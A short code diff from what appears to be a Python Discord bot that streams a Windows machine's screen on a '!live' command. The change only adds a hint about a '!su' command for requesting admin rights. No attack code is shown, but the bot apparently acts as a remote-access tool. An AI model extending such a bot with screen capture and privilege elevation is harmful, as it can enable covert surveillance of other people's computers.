@@ -437,7 +437,7 @@ async def live(ctx):
     
     try:
         if not ctypes.windll.shell32.IsUserAnAdmin():
-            await ctx.send("❌ You must run the bot as administrator to use !live (screen streaming).")
+            await ctx.send("❌ You must run the bot as administrator to use !live (screen streaming). Use !su command to request admin.")
             return
     except Exception as e:
         await ctx.send(f"❌ Unable to check admin privileges: {e}")
